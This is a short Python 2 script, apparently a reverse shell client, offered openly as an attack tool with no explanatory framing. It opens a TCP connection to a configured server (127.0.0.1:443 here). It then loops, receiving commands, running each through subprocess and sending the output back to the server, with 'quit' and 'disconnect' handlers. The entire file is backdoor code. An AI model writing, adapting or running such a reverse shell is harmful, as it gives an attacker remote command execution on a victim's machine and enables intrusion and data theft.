import os
import socket
import subprocess
import sys

host = '127.0.0.1'
port = 443

# Create Socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect to Server
s.connect((host, port))

# CWD Shell Prompt
# cwd = os.getcwd()
# s.send(cwd)

# Reverse Shell
while True:
    srv_cmd = s.recv(1024)
    if srv_cmd == "quit":
        print "[-] Interactive Mode Disabled"
    elif srv_cmd == "disconnect":
        print "[-] Disconnecting from server"
        s.close()
        exit()
    else:
        cmd = subprocess.Popen(srv_cmd, shell=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

        output = cmd.stdout.read() + cmd.stderr.read()
        s.send(output)
        cmd.terminate()

s.close()
